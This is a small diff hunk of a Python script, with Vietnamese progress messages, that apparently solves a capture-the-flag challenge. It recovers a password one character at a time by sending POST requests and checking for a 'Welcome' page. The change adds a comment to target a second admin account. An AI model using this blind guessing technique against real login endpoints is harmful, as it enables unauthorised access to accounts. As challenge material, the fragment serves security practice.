@@ -273,7 +273,7 @@ for index in range (50):
         # Gửi POST request
         response = requests.post(url, headers=headers, data=json.dumps(data))
         print("Tui đang thử kí tự thứ ",index," nè: ", i, end="\r")
-        if "<h1>Welcome, testuser</h1>" in response.text:
+        if "<h1>Welcome, testuser</h1>" in response.text: # Change testuser to the second admin
             password+=i
             print("Tìm ra kí tự thứ ", index, "là ", i, "(FLAG:",password,")")
             break
